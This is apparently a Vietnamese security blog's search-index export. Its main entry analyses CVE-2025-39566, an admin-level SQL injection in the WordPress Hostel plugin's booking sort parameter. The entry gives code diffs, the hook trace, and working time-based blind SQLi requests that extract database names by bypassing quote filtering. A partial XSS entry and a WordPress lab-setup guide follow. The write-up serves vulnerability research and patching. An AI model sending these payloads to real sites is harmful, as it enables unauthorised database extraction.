href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY 